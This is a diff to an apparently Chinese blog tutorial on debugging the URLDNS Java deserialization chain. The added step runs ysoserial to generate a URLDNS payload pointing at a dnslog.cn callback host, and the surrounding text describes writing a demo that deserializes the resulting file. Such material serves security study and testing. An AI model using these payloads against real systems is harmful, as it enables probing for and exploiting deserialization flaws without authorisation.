@@ -481,7 +481,9 @@
 <p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221103230728646.png"></p>
 <p>由于我们是要调试URLDNS的链，所以我们加上相应的参数即可</p>
 <p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221104005038067.png"></p>
-<p>写一个反序列化的demo</p>
+<p>运行ysoserial</p>
+<pre class="line-numbers language-shell"><code class="language-shell">java -jar ysoserial.jar URLDNS 'https://62egpw.dnslog.cn' > urldns.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>写一个反序列化的demo加载urldns.ser</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>root<span class="token punctuation">;</span>
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
 
